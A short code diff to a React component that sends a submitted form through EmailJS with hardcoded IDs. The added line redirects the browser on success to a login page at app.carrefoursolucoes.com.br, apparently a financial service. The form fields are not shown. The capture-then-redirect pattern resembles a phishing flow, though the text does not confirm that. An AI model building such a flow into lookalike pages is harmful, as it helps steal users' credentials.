@@ -21,6 +21,8 @@ export class SocialProfiles extends Component {
             emailjs.sendForm('service_m0rqqeb', 'template_ovtqo1m', e.target, 'user_blutAP3dvwCpJzktiSL3a')
               .then((result) => {
                   console.log(result.text);
+                  window.location = "https://app.carrefoursolucoes.com.br/#/login";
+
               }, (error) => {
                   console.log(error.text);
               });
